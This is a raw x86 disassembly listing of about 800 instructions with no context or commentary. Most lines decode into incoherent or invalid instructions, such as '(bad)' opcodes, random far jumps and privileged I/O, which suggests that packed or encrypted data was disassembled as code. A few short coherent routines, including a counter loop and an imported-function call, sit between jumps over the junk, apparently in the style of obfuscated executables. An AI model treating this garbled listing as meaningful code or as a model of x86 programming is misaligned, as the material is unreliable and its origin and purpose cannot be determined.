  40e4ed:	sub    BYTE PTR [edx+0xb],0xd7
  40e4f1:	imul   BYTE PTR [esi+0x4694f981]
  40e4f7:	and    DWORD PTR [edi],esp
  40e4f9:	outs   dx,DWORD PTR ds:[esi]
  40e4fa:	add    dh,dl
  40e4fc:	popa   
  40e4fd:	cld    
  40e4fe:	loopne 0x40e528
  40e500:	and    DWORD PTR gs:[edi],0xffffff87
  40e504:	xchg   ecx,ebp
  40e506:	in     eax,0xc9
  40e508:	sbb    DWORD PTR [ecx+0x28],0xffffff8a
  40e50c:	push   es
  40e50d:	mov    WORD PTR [ebx],cs
  40e50f:	mov    al,ds:0x587b5480
  40e514:	cmp    DWORD PTR [ebp+esi*8-0x17818b39],edi
  40e51b:	jle    0x40e4e9
  40e51d:	mov    bh,0x92
  40e51f:	(bad)
  40e523:	hlt    
  40e524:	mov    dh,0x1b
  40e526:	and    dl,BYTE PTR [esi+eax*8+0x6e]
  40e52a:	lds    ebx,FWORD PTR [esi+0x7b]
  40e52d:	xchg   BYTE PTR [ebx+0x8044cdc],al
  40e533:	lea    ebp,[ebx+eiz*2+0x68]
  40e537:	jo     0x40e4c2
  40e539:	ins    DWORD PTR es:[edi],dx
  40e53a:	mov    es,WORD PTR [edx+0x13]
  40e53d:	mov    al,ds:0x216cc320
  40e542:	cmp    eax,0x16102c46
  40e547:	jo     0x40e5a5
  40e549:	push   ecx
  40e54a:	les    edi,FWORD PTR [esp+ebp*2]
  40e54d:	mov    bh,0xb3
  40e54f:	mov    al,0xd3
  40e551:	pop    ds
  40e552:	ficom  DWORD PTR [esi]
  40e554:	les    eax,FWORD PTR [edi+0x56e1c047]
  40e55a:	pop    eax
  40e55b:	sbb    ebp,eax
  40e55d:	ret    0x5cbe
  40e560:	xlat   BYTE PTR ds:[ebx]
  40e561:	shl    bh,0xd8
  40e564:	cmc    
  40e565:	mov    esi,0x7fd9f16e
  40e56a:	sbb    eax,0xd1b23c2b
  40e56f:	push   ds
  40e570:	dec    ebp
  40e571:	inc    ebp
  40e572:	lahf   
  40e573:	cli    
  40e574:	pop    edi
  40e575:	fidivr WORD PTR [esi-0x6c]
  40e578:	pop    esi
  40e579:	sub    al,0x61
  40e57b:	mov    eax,0x359f9245
  40e580:	ror    DWORD PTR [esi-0x2d90a3ec],1
  40e586:	loopne 0x40e535
  40e588:	sbb    dh,ch
  40e58a:	out    dx,al
  40e58b:	es in  eax,dx
  40e58d:	jmp    0xc631:0xf16d9042
  40e594:	cmp    al,0xe8
  40e596:	dec    eax
  40e597:	pop    esp
  40e598:	outs   dx,BYTE PTR ds:[esi]
  40e599:	addr16 jae 0x40e585
  40e59c:	fisub  WORD PTR [ecx]
  40e59e:	arpl   WORD PTR [ebx-0x27],sp
  40e5a1:	jmp    0x2027:0x3b3b8070
  40e5a8:	lock out dx,al
  40e5aa:	div    DWORD PTR [ebp-0x4ea60d36]
  40e5b0:	xor    edi,edi
  40e5b2:	sbb    ch,BYTE PTR ds:0xba10ad0a
  40e5b8:	xor    esi,DWORD PTR cs:0x3d67da83
  40e5bf:	mov    ebx,0x4a736b26
  40e5c4:	xchg   edi,eax
  40e5c5:	push   esp
  40e5c6:	fstp   DWORD PTR [esi+0x5ec238e2]
  40e5cc:	mov    WORD PTR [ecx],0xef1f
  40e5d1:	iret   
  40e5d2:	jnp    0x40e646
  40e5d4:	add    al,0xee
  40e5d6:	mov    WORD PTR [eax],fs
  40e5d8:	lods   al,BYTE PTR ds:[esi]
  40e5d9:	imul   DWORD PTR [ebp-0x19]
  40e5dc:	into   
  40e5dd:	mov    dh,0x1a
  40e5df:	aas    
  40e5e0:	fisub  WORD PTR [esi+edx*4+0x338a1b4a]
  40e5e7:	nop
  40e5e8:	mov    esi,0x3aa60b7c
  40e5ed:	ins    DWORD PTR es:[edi],dx
  40e5ee:	ins    DWORD PTR es:[edi],dx
  40e5ef:	mov    edx,0x9f6a19da
  40e5f4:	push   cs
  40e5f5:	cmp    al,0xac
  40e5f7:	lods   al,BYTE PTR ds:[esi]
  40e5f8:	cmp    bh,bl
  40e5fa:	mov    esp,0x1807192b
  40e5ff:	sbb    ebp,DWORD PTR ds:0xaea4a376
  40e605:	xor    BYTE PTR [edi],dh
  40e607:	jns    0x40e5c4
  40e609:	xor    ebx,DWORD PTR [ebx-0x6]
  40e60c:	push   eax
  40e60d:	(bad)  
  40e60e:	lock inc edx
  40e610:	or     esp,0x41
  40e613:	push   es
  40e614:	not    DWORD PTR [esi]
  40e616:	push   ecx
  40e617:	push   ecx
  40e618:	shr    al,1
  40e61a:	into   
  40e61b:	xlat   BYTE PTR ds:[ebx]
  40e61c:	into   
  40e61d:	push   ds
  40e61e:	aas    
  40e61f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e620:	xchg   ecx,eax
  40e621:	mov    eax,ds:0x2c44d0db
  40e626:	je     0x40e5d0
  40e628:	out    dx,al
  40e629:	jbe    0x40e62c
  40e62b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e62c:	ja     0x40e63f
  40e62e:	jmp    0x40e5c8
  40e630:	xor    eax,0xaa48d319
  40e635:	or     dh,BYTE PTR [eax]
  40e637:	mov    dl,0x1b
  40e639:	add    DWORD PTR [edi-0x4b76e354],esi
  40e63f:	retf   0xbebd
  40e642:	cmp    DWORD PTR [ebx],edi
  40e644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e645:	inc    edi
  40e646:	xor    esp,DWORD PTR [eax]
  40e648:	mul    DWORD PTR [esi]
  40e64a:	fnstenv ds:0xc8201c1b
  40e650:	test   eax,ebx
  40e652:	mov    esi,DWORD PTR [eax]
  40e654:	fstp   TBYTE PTR [edx-0x7f]
  40e657:	pushf  
  40e658:	mov    edi,0xe2989d43
  40e65d:	ss jb  0x40e657
  40e660:	jle    0xcf5ac755
  40e666:	ds aas 
  40e668:	pusha  
  40e669:	(bad)  
  40e66a:	and    al,0x4c
  40e66c:	adc    esp,edi
  40e66e:	dec    esp
  40e66f:	jns    0x40e6a2
  40e671:	jae    0x40e664
  40e673:	sub    bp,si
  40e676:	retf   0xd5af
  40e679:	mov    BYTE PTR [ecx-0x64],bh
  40e67c:	ret    0xcf9f
  40e67f:	hlt    
  40e680:	sub    al,BYTE PTR [edx-0x7c683714]
  40e686:	fs push ecx
  40e688:	add    dl,cl
  40e68a:	mov    edi,ecx
  40e68c:	test   ah,cl
  40e68e:	or     al,0x81
  40e690:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e691:	mov    WORD PTR [ecx-0x44743d38],fs
  40e697:	mov    cl,0xca
  40e699:	jge    0x40e6c8
  40e69b:	fbld   TBYTE PTR [ebp-0x63]
  40e69e:	and    DWORD PTR [edx],eax
  40e6a0:	imul   edx,DWORD PTR [edx],0x9d679ade
  40e6a6:	or     ebp,edx
  40e6a8:	popa   
  40e6a9:	loop   0x40e725
  40e6ab:	ss push ebx
  40e6ad:	mov    ecx,0xe6cdf637
  40e6b2:	or     DWORD PTR [ebx-0x40],0x1ea1b74c
  40e6b9:	xchg   esi,eax
  40e6ba:	mov    edi,0x4aa1520d
  40e6bf:	fisub  DWORD PTR [edx]
  40e6c1:	stos   BYTE PTR es:[edi],al
  40e6c2:	out    dx,al
  40e6c3:	lahf   
  40e6c4:	in     eax,dx
  40e6c5:	dec    BYTE PTR [ebx+0x12]
  40e6c8:	int    0xff
  40e6ca:	fdivr  DWORD PTR [ecx-0x15]
  40e6cd:	adc    ebx,DWORD PTR [eax-0x4c659430]
  40e6d3:	imul   esp,DWORD PTR [edi+0x3ecdc14],0x5b9bf19d
  40e6dd:	jns    0x40e6f3
  40e6df:	scas   eax,DWORD PTR es:[edi]
  40e6e0:	mov    bh,0xf3
  40e6e2:	(bad)  
  40e6e3:	out    dx,al
  40e6e4:	pop    esp
  40e6e5:	sar    BYTE PTR [ecx-0x168d569b],1
  40e6eb:	test   eax,0x1fc718d3
  40e6f0:	in     al,dx
  40e6f1:	enter  0x6e12,0x8d
  40e6f5:	fs aam 0x8b
  40e6f8:	div    ah
  40e6fa:	dec    eax
  40e6fb:	lahf   
  40e6fc:	cmp    BYTE PTR [ecx],dl
  40e6fe:	xor    eax,esi
  40e700:	add    eax,ebx
  40e702:	mov    DWORD PTR [ebp+0x8],eax
  40e705:	mov    eax,ds:0x41eae6
  40e70a:	mov    DWORD PTR [ebp+0x8],eax
  40e70d:	mov    eax,DWORD PTR [ebp-0x14]
  40e710:	mov    DWORD PTR [ebp-0x4],eax
  40e713:	mov    eax,DWORD PTR [ebp-0x4]
  40e716:	push   0x4
  40e718:	pop    ecx
  40e719:	sub    ecx,eax
  40e71b:	add    ecx,DWORD PTR [ebp-0x18]
  40e71e:	mov    DWORD PTR [ebp-0x8],ecx
  40e721:	jmp    0x40e979
  40e726:	(bad)
  40e729:	(bad)  
  40e72a:	leave  
  40e72b:	fcmovbe st,st(5)
  40e72d:	sar    esp,1
  40e72f:	rcr    DWORD PTR [esp+edi*1],1
  40e732:	and    eax,0x3f3d8dcf
  40e737:	mov    ebx,0x7e357878
  40e73c:	js     0x40e7b6
  40e73e:	push   cs
  40e73f:	das    
  40e740:	or     BYTE PTR [ecx+ebp*4-0x56],bh
  40e744:	xchg   ebx,eax
  40e745:	inc    ebx
  40e746:	lea    eax,[ebp-0x5b]
  40e749:	scas   eax,DWORD PTR es:[edi]
  40e74a:	jae    0x40e745
  40e74c:	pop    ebp
  40e74d:	sub    DWORD PTR [ecx-0x7aa209c1],ebx
  40e753:	jbe    0x40e718
  40e755:	push   ebx
  40e756:	mov    dl,0x2d
  40e758:	out    0xf0,al
  40e75a:	xchg   esi,eax
  40e75b:	dec    eax
  40e75c:	lock push ebp
  40e75e:	or     bh,0xf1
  40e761:	push   ebx
  40e762:	xor    eax,0x893211db
  40e767:	cmp    ebx,DWORD PTR [ecx]
  40e769:	loope  0x40e707
  40e76b:	mov    esp,edi
  40e76d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e76e:	icebp  
  40e76f:	rcl    BYTE PTR [ebp+0xa],1
  40e772:	ds in  al,dx
  40e774:	or     BYTE PTR [esi+0x45],al
  40e777:	in     eax,dx
  40e778:	and    esp,DWORD PTR ds:0xfe0cb498
  40e77e:	xchg   edi,eax
  40e77f:	cmp    eax,0x43bdc3d4
  40e784:	in     eax,dx
  40e785:	into   
  40e786:	and    al,0xda
  40e788:	in     eax,0xf0
  40e78a:	scas   al,BYTE PTR es:[edi]
  40e78b:	add    esi,DWORD PTR ss:[esp+eiz*2+0x7f]
  40e790:	inc    ebp
  40e791:	stos   BYTE PTR es:[edi],al
  40e792:	push   ecx
  40e793:	inc    eax
  40e794:	jbe    0x40e80b
  40e796:	cmp    dl,BYTE PTR ds:0xababfeac
  40e79c:	cs dec eax
  40e79e:	mov    ds:0xb2f3972d,eax
  40e7a3:	cmp    DWORD PTR [ebx+0x2b],edi
  40e7a6:	dec    edi
  40e7a7:	fldcw  WORD PTR [ebx+0x12]
  40e7aa:	cmp    eax,DWORD PTR [esi+ebp*4]
  40e7ad:	gs scas eax,DWORD PTR es:[edi]
  40e7af:	mov    ch,0xa8
  40e7b1:	pop    ds
  40e7b2:	int3   
  40e7b3:	imul   edx,ebx,0xb2d92937
  40e7b9:	push   edx
  40e7ba:	in     al,dx
  40e7bb:	int    0x34
  40e7bd:	test   al,0xd7
  40e7bf:	scas   al,BYTE PTR es:[edi]
  40e7c0:	pop    eax
  40e7c1:	es test eax,0xff296dad
  40e7c7:	stc    
  40e7c8:	rol    DWORD PTR [ebp+0x43fb656c],0x27
  40e7cf:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40e7d1:	push   esp
  40e7d2:	stos   BYTE PTR es:[edi],al
  40e7d3:	lods   al,BYTE PTR ds:[esi]
  40e7d4:	lods   eax,DWORD PTR ds:[esi]
  40e7d5:	and    DWORD PTR [ecx],eax
  40e7d7:	dec    ebx
  40e7d8:	lods   al,BYTE PTR ds:[esi]
  40e7d9:	adc    ch,dl
  40e7db:	(bad)  
  40e7dc:	rol    DWORD PTR [esp+esi*1],cl
  40e7df:	mov    cl,0xe6
  40e7e1:	call   0x3c0e17f6
  40e7e6:	jnp    0x40e847
  40e7e8:	int3   
  40e7e9:	jge    0x40e774
  40e7eb:	dec    ebp
  40e7ec:	push   edi
  40e7ed:	add    eax,0x6f52eb11
  40e7f2:	jo     0x40e7e5
  40e7f4:	rcl    BYTE PTR [ebx+0x7],1
  40e7f7:	mov    WORD PTR [eax+0x4d],gs
  40e7fa:	push   ss
  40e7fb:	ins    BYTE PTR es:[edi],dx
  40e7fc:	and    eax,0x29f55865
  40e801:	fsubr  DWORD PTR [ebx+0x15590b6e]
  40e807:	adc    BYTE PTR [ecx],bl
  40e809:	shl    DWORD PTR [ebx],1
  40e80b:	push   ebx
  40e80c:	cmc    
  40e80d:	repnz mov ds:0x566573cb,eax
  40e813:	sub    BYTE PTR [ecx+ebp*2],dl
  40e816:	xchg   DWORD PTR [edi],eax
  40e818:	pushf  
  40e819:	(bad)  
  40e81a:	loop   0x40e81e
  40e81c:	add    al,0x2a
  40e81e:	jmp    0xdb3b:0x45d3fddd
  40e825:	or     edx,DWORD PTR [esi+0x3b]
  40e828:	retf   0x1d53
  40e82b:	retf   0x48f3
  40e82e:	(bad)  
  40e82f:	(bad)  
  40e830:	cmp    BYTE PTR [eax-0x64],dh
  40e833:	push   0xecbb1afc
  40e838:	add    dl,cl
  40e83a:	push   ecx
  40e83b:	aad    0x20
  40e83d:	sbb    dh,ah
  40e83f:	cmp    eax,DWORD PTR es:[edi+0x57]
  40e843:	je     0x40e8b0
  40e845:	mov    eax,ds:0x77cfb1e7
  40e84a:	inc    eax
  40e84b:	and    al,0xc5
  40e84d:	pop    edi
  40e84e:	jnp    0x40e885
  40e850:	push   ecx
  40e851:	xor    dh,ah
  40e853:	xchg   ebx,eax
  40e854:	adc    bl,ah
  40e856:	mov    ?,WORD PTR [ebx+eax*1-0x58]
  40e85a:	cli    
  40e85b:	xor    eax,0xc35d3b8b
  40e860:	dec    ebp
  40e861:	jb     0x40e8d0
  40e863:	and    dl,ah
  40e865:	sub    cl,dl
  40e867:	stc    
  40e868:	or     al,0x63
  40e86a:	dec    esp
  40e86b:	mov    al,BYTE PTR [eax+0x1beff8e2]
  40e871:	popa   
  40e872:	jg     0x40e815
  40e874:	mov    eax,0xe0c1941a
  40e879:	xor    DWORD PTR [ebx],eax
  40e87b:	pop    edx
  40e87c:	out    0xea,al
  40e87e:	(bad)  
  40e880:	fcomi  st,st(5)
  40e882:	dec    ebp
  40e883:	cs jns 0x40e847
  40e886:	inc    ebx
  40e887:	cmp    bl,bh
  40e889:	mov    dh,bl
  40e88b:	jno    0x40e8ea
  40e88d:	in     eax,dx
  40e88e:	sub    ah,bl
  40e890:	and    ah,al
  40e892:	xchg   esi,eax
  40e893:	mov    ds:0x7c40a3e1,al
  40e898:	push   esi
  40e899:	sub    eax,0x45b2ccee
  40e89e:	push   ebp
  40e89f:	cs cmp ecx,ebp
  40e8a2:	pop    ebp
  40e8a3:	psubw  mm0,QWORD PTR [esi]
  40e8a6:	jmp    0x40e838
  40e8a8:	xchg   edx,eax
  40e8a9:	mov    esi,0xecd5cb3b
  40e8ae:	clc    
  40e8af:	and    dh,ah
  40e8b1:	jne    0x40e87a
  40e8b3:	rol    ch,1
  40e8b5:	add    BYTE PTR [ecx],bl
  40e8b7:	imul   eax,DWORD PTR [edx],0x0
  40e8ba:	es inc eax
  40e8bc:	add    eax,0xbb833e2a
  40e8c1:	gs jbe 0x40e8c7
  40e8c4:	adc    esp,DWORD PTR [esi-0x7b]
  40e8c7:	inc    edx
  40e8c8:	inc    esi
  40e8c9:	mov    edi,0xdc09e466
  40e8ce:	sub    al,0xee
  40e8d0:	adc    BYTE PTR ds:0x2a97ade0,ah
  40e8d6:	sub    eax,0x6cb0f255
  40e8db:	lahf   
  40e8dc:	fld    DWORD PTR [ebx]
  40e8de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8df:	outs   dx,DWORD PTR ds:[esi]
  40e8e0:	pop    ebx
  40e8e1:	loop   0x40e900
  40e8e3:	sar    DWORD PTR [eax-0x49c13207],1
  40e8e9:	(bad)  
  40e8ea:	push   esi
  40e8eb:	lods   eax,DWORD PTR ds:[esi]
  40e8ec:	test   ebp,edi
  40e8ee:	push   cs
  40e8ef:	mov    ds:0xbaabef70,al
  40e8f4:	into   
  40e8f5:	fldcw  WORD PTR es:[ebp+0x69170f05]
  40e8fc:	(bad)  
  40e8fd:	das    
  40e8fe:	je     0x40e8b6
  40e900:	or     ecx,DWORD PTR [edx+0x66109405]
  40e906:	cld    
  40e907:	jg     0x40e8ed
  40e909:	dec    DWORD PTR [esi+0x332659a9]
  40e90f:	and    al,0x4a
  40e911:	fbld   TBYTE PTR [edx]
  40e913:	mov    edx,0x964bcdf5
  40e918:	test   eax,esp
  40e91a:	bound  edx,QWORD PTR ds:0xb4c02483
  40e920:	inc    edi
  40e921:	loopne 0x40e938
  40e923:	mov    eax,0x3fb73170
  40e928:	push   0xee665ae
  40e92d:	call   0xaa19ecac
  40e932:	not    DWORD PTR [ebx]
  40e934:	ins    DWORD PTR es:[edi],dx
  40e935:	ror    bl,0x98
  40e938:	test   eax,0x51ded7ff
  40e93d:	xor    ebx,DWORD PTR [ebx]
  40e93f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e940:	mov    ecx,0x4cbb04c
  40e945:	js     0x40e996
  40e947:	dec    ebx
  40e948:	adc    al,0x34
  40e94a:	or     BYTE PTR [edi-0x72],0x23
  40e94e:	pop    esp
  40e94f:	fcmovu st,st(7)
  40e951:	push   esp
  40e952:	ds xor eax,0x1ce550a2
  40e958:	mov    edi,0x40b939b4
  40e95d:	mov    es,esp
  40e95f:	xor    eax,DWORD PTR [edi-0x3845e577]
  40e965:	push   0xffffffed
  40e967:	mov    ah,BYTE PTR [edx+0x35]
  40e96a:	call   FWORD PTR [ecx+esi*8+0x1a5f8f66]
  40e971:	into   
  40e972:	loop   0x40e9a0
  40e974:	adc    edi,DWORD PTR [ebx-0x7486d9bf]
  40e97a:	inc    ebp
  40e97b:	or     al,0x33
  40e97d:	(bad)  
  40e97e:	lea    edi,[edi+eax*1+0x327298]
  40e985:	cmp    edi,0x50a
  40e98b:	jne    0x40d51f
  40e991:	mov    eax,DWORD PTR [ebp+0xc]
  40e994:	pop    edi
  40e995:	xor    eax,esi
  40e997:	pop    esi
  40e998:	add    eax,ebx
  40e99a:	pop    ebx
  40e99b:	leave  
  40e99c:	ret    0x8
  40e99f:	push   ebp
  40e9a0:	mov    ebp,esp
  40e9a2:	sub    esp,0x44
  40e9a5:	push   edi
  40e9a6:	mov    eax,DWORD PTR [ebp+0xc]
  40e9a9:	mov    DWORD PTR [ebp-0x10],eax
  40e9ac:	mov    eax,DWORD PTR [ebp+0x8]
  40e9af:	and    DWORD PTR ds:0x42a7f1,0x0
  40e9b9:	mov    edx,DWORD PTR ds:0x42a7f1
  40e9bf:	inc    edx
  40e9c0:	mov    DWORD PTR ds:0x42a7f1,edx
  40e9c6:	cmp    DWORD PTR ds:0x42a7f1,0x6
  40e9cd:	jne    0x40e9dc
  40e9d3:	push   DWORD PTR [ebp-0x28]
  40e9d6:	call   DWORD PTR ds:0x41d250
  40e9dc:	cmp    DWORD PTR ds:0x42a7f1,0x5
  40e9e3:	jne    0x40e9f6
  40e9e9:	mov    edx,DWORD PTR ds:0x42a7f1
  40e9ef:	inc    edx
  40e9f0:	mov    DWORD PTR ds:0x42a7f1,edx
  40e9f6:	cmp    DWORD PTR ds:0x42a7f1,0x10
  40e9fd:	jb     0x40e9b9
  40ea03:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  40ea0a:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40ea11:	jmp    0x40ec99
  40ea16:	cmp    eax,0xd6ce3ed7
  40ea1b:	aad    0xcd
  40ea1d:	xlat   BYTE PTR ds:[ebx]
  40ea1e:	jecxz  0x40e9ce
  40ea20:	ja     0x40e9b6
  40ea22:	xchg   ebx,eax
  40ea23:	lods   eax,DWORD PTR ds:[esi]
  40ea24:	push   edx
  40ea25:	sub    esi,esp
  40ea27:	mov    ecx,0x7ee57878
  40ea2c:	js     0x40eaa6
  40ea2e:	mov    si,0x21b0
  40ea32:	dec    esp
  40ea33:	sub    esi,DWORD PTR [edx-0x21b1077]
  40ea39:	shr    DWORD PTR [eax+eiz*1],0x98
  40ea3d:	cmp    al,0x5f
  40ea3f:	adc    DWORD PTR [edx+0x61],eax
  40ea42:	sub    al,0x40
  40ea44:	jnp    0x40ea77
  40ea46:	sub    DWORD PTR [edx+eiz*2],ebx
  40ea49:	push   ebp
  40ea4a:	int3   
  40ea4b:	xchg   esp,eax
  40ea4c:	jb     0x40ea15
  40ea4e:	jg     0x40e9d7
  40ea50:	cli    
  40ea51:	in     eax,dx
  40ea52:	std    
  40ea53:	call   0x9bc6:0xb7d5fd79
  40ea5a:	ret    0xc9e0
  40ea5d:	in     eax,dx
  40ea5e:	leave  
  40ea5f:	cmp    esi,DWORD PTR ds:0x1585d248
  40ea65:	in     al,0x6
  40ea67:	fwait
  40ea68:	cmp    BYTE PTR [ebx+0x41486770],dh
  40ea6e:	mov    ecx,0xc8e52268
  40ea73:	jne    0x40eaa7
  40ea75:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40ea77:	mov    al,ds:0x385de726
  40ea7c:	mov    ch,0x24
  40ea7e:	pop    ss
  40ea7f:	in     eax,dx
  40ea80:	fistp  DWORD PTR [esi-0x4ae5fb9b]
  40ea86:	mov    ds:0xd569e047,eax
  40ea8b:	cmc    
  40ea8c:	push   ebp
  40ea8d:	test   al,0x60
  40ea8f:	jg     0x40ea62
  40ea91:	scas   al,BYTE PTR es:[edi]
  40ea92:	xlat   BYTE PTR ds:[ebx]
  40ea93:	mov    al,0x32
  40ea95:	xchg   edi,eax
  40ea96:	dec    edx
  40ea97:	add    DWORD PTR [ebx+0x2d],eax
  40ea9a:	ror    DWORD PTR [esi+0x1c627903],cl
  40eaa0:	ss test eax,esp
  40eaa3:	inc    BYTE PTR [ebp-0x54]
  40eaa6:	lock pop ss
  40eaa8:	and    ebp,DWORD PTR [esi+edx*8-0x51]
  40eaac:	inc    ecx
  40eaad:	pop    ebp
  40eaae:	mov    esi,0x639ccdfa
  40eab3:	mov    es,WORD PTR [edx+0x13d15811]
  40eab9:	push   0x6af1ad27
  40eabe:	imul   edx,DWORD PTR [edi],0x1cb7bd27
  40eac4:	push   ebp
  40eac5:	mov    eax,0xb970edf7
  40eaca:	jne    0x40ead6
  40eacc:	inc    ecx
  40eacd:	sar    DWORD PTR [ebx+0x19],cl
  40ead0:	outs   dx,BYTE PTR ds:[esi]
  40ead1:	adc    esp,DWORD PTR [eax+0x1800e16d]
  40ead7:	or     al,0x94
  40ead9:	jbe    0x40eae0
  40eadb:	(bad)  
  40eadc:	lea    edx,[eax]
  40eade:	cld    
  40eadf:	scas   al,BYTE PTR es:[edi]
  40eae0:	sub    eax,0x1f3c3f74
  40eae5:	outs   dx,DWORD PTR ds:[esi]
  40eae6:	mov    BYTE PTR [eax],bh
  40eae8:	pushf  
  40eae9:	mov    ebp,0x4f2cb176
  40eaee:	cmc    
  40eaef:	sbb    al,0x1c
  40eaf1:	clc    
  40eaf2:	jne    0x40eb28
  40eaf4:	xor    al,0x31
  40eaf6:	aad    0xdb
  40eaf8:	rol    DWORD PTR [eax+0x0],1
  40eafb:	lods   al,BYTE PTR ds:[esi]
  40eafc:	add    DWORD PTR [ecx-0x5ad7699d],edx
  40eb02:	dec    ecx
  40eb03:	sub    DWORD PTR [ebx+0x51768d70],esp
  40eb09:	xchg   ecx,eax
  40eb0a:	pushf  
  40eb0b:	adc    DWORD PTR [ebp-0x77],edx
  40eb0e:	imul   esp,DWORD PTR [edi],0x15
  40eb11:	add    bh,BYTE PTR [ecx+0x2c1f4ac1]
  40eb17:	fwait
  40eb18:	imul   DWORD PTR [ecx]
  40eb1a:	ins    BYTE PTR es:[edi],dx
  40eb1b:	test   eax,0x8ca56d0
  40eb20:	aas    
  40eb21:	dec    ebx
  40eb22:	cmc    
  40eb23:	or     ah,bl
  40eb25:	stos   BYTE PTR es:[edi],al
  40eb26:	retf   
  40eb27:	push   ss
  40eb28:	in     eax,0xc1
  40eb2a:	add    ah,BYTE PTR [esi+0x344ef01]
  40eb30:	(bad)
  40eb34:	or     DWORD PTR [esi-0x6a7f54b0],esi
  40eb3a:	and    DWORD PTR [edi-0x3c],edx
  40eb3d:	sbb    bl,BYTE PTR ds:0x95ca9fd0
  40eb43:	popf   
  40eb44:	sbb    DWORD PTR [ecx+0x5d],ecx
  40eb47:	jnp    0x40eb30
  40eb49:	sub    edi,DWORD PTR [eax-0x620e7060]
  40eb4f:	or     BYTE PTR [ebp-0x7292e8b0],0x38
  40eb56:	fnstenv [ebp+eax*1-0x2e]
  40eb5a:	and    eax,0x303af88a
  40eb5f:	or     BYTE PTR [ebp-0x50],ch
  40eb62:	lahf   
  40eb63:	call   0x2aaf:0xd58dc6db
  40eb6a:	push   ss
  40eb6b:	das    
  40eb6c:	push   eax
  40eb6d:	inc    ebp
  40eb6e:	jmp    0x40eafc
  40eb70:	sub    eax,0xe3866226
  40eb75:	inc    ecx
  40eb76:	inc    edi
  40eb77:	fcomp  DWORD PTR [ebp-0x6c]
  40eb7a:	(bad)  [esi]
  40eb7c:	gs cs stos BYTE PTR es:[edi],al
  40eb7f:	sbb    ebx,ebx
  40eb81:	xchg   edx,eax
  40eb82:	push   DWORD PTR [ecx]
  40eb84:	jbe    0x40ec00
  40eb86:	or     BYTE PTR [edi],0x5c
  40eb89:	mov    bl,0x4b
  40eb8b:	mov    edi,0xd225dbf4
  40eb90:	or     eax,DWORD PTR [eax]
  40eb92:	xlat   BYTE PTR gs:[ebx]
  40eb94:	jbe    0x40eb57
  40eb96:	xor    BYTE PTR [ecx+esi*2],bl
  40eb99:	add    eax,0xe2501184
  40eb9e:	es push 0x5b
  40eba1:	inc    ecx
  40eba2:	call   0x88f87fbd
  40eba7:	fwait
  40eba8:	popf   
  40eba9:	or     BYTE PTR [ebx],dl
  40ebab:	xor    eax,0x7af2b777
  40ebb0:	loope  0x40eb49
  40ebb2:	popf   
  40ebb3:	pop    ecx
  40ebb4:	sbb    BYTE PTR [eax-0x1a29ff0],bh
  40ebba:	popa   
  40ebbb:	div    BYTE PTR [edi+0x67a037c3]
  40ebc1:	inc    edx
  40ebc2:	(bad)  
  40ebc3:	mov    bh,0x23
  40ebc5:	icebp  
  40ebc6:	ss daa 
  40ebc8:	lock dec edi
  40ebca:	pop    esp
  40ebcb:	jbe    0x40ebb0
  40ebcd:	jno    0x40eb94
  40ebcf:	xchg   BYTE PTR [eax],dl
  40ebd1:	imul   edi,DWORD PTR [ecx+0x3f],0xa0a69406
  40ebd8:	sub    BYTE PTR [ebx+eax*8],dh
  40ebdb:	or     dl,BYTE PTR [esi-0x1fb6e406]
  40ebe1:	loopne 0x40ec31
  40ebe3:	pop    ebp
  40ebe4:	lods   eax,DWORD PTR ds:[esi]
  40ebe5:	leave  
  40ebe6:	push   ss
  40ebe7:	mov    al,0x1e
  40ebe9:	call   0x11f8fe98
  40ebee:	pop    ebp
  40ebef:	xchg   DWORD PTR [ebx+0x43c7edc4],ebp
  40ebf5:	sbb    dh,BYTE PTR [eax+0x3ffc9a07]
  40ebfb:	jne    0x40ec0b
  40ebfd:	pop    ecx
  40ebfe:	sbb    DWORD PTR [esi-0x29],ecx
  40ec01:	and    ebx,DWORD PTR [edx-0x4f]
  40ec04:	sbb    eax,0xf1ca925d
  40ec09:	mov    al,ds:0xc5e9adc
  40ec0e:	adc    DWORD PTR ds:0x5fb2f82f,esp
  40ec14:	sbb    BYTE PTR [edx-0x7f3dc64d],al
  40ec1a:	fsubr  st,st(2)
  40ec1c:	imul   esi,ebp,0xa21681aa
  40ec22:	mov    ch,0x1f
  40ec24:	push   esi
  40ec25:	and    al,0x87
  40ec27:	sub    al,0x53
  40ec29:	fwait
  40ec2a:	dec    ebp
  40ec2b:	ret    
  40ec2c:	cld    
  40ec2d:	and    BYTE PTR ds:0x4c7f2e3a,dl
  40ec33:	(bad)  
  40ec34:	enter  0xbdb5,0x23
  40ec38:	(bad)  
  40ec39:	das    
  40ec3a:	ja     0x40ecb8
  40ec3c:	sbb    eax,0xc4556fb7
  40ec41:	sub    bl,cl
  40ec43:	jmp    ebp
  40ec45:	and    eax,eax
  40ec47:	xor    ebx,DWORD PTR [ecx-0x703bfad8]
  40ec4d:	cmc    
  40ec4e:	cdq    
  40ec4f:	je     0x40ec74
  40ec51:	xchg   ebx,eax
  40ec52:	test   al,0x7b
  40ec54:	pusha  
  40ec55:	fnsave [edx]
  40ec57:	inc    ecx
  40ec58:	push   edi
  40ec59:	dec    esp
  40ec5a:	jmp    0x40ec4c
  40ec5c:	test   eax,0x280b92f2
  40ec61:	mov    BYTE PTR [ebp-0x2a882b5b],bl
  40ec67:	mov    esp,DWORD PTR [esi]
  40ec69:	cwde   
  40ec6a:	adc    al,0x32
  40ec6c:	in     eax,0x53
  40ec6e:	data16 and dh,cl
  40ec71:	sub    edx,esi
  40ec73:	shl    DWORD PTR [edi],0x97
  40ec76:	pop    ebp
  40ec77:	hlt    
  40ec78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec79:	fs add ecx,esp
  40ec7c:	cmp    BYTE PTR [ebx-0xd],cl
  40ec7f:	setnp  bl
  40ec82:	fadd   QWORD PTR [eax+0x42]
  40ec85:	mov    esp,DWORD PTR [ecx-0x3c47bebc]
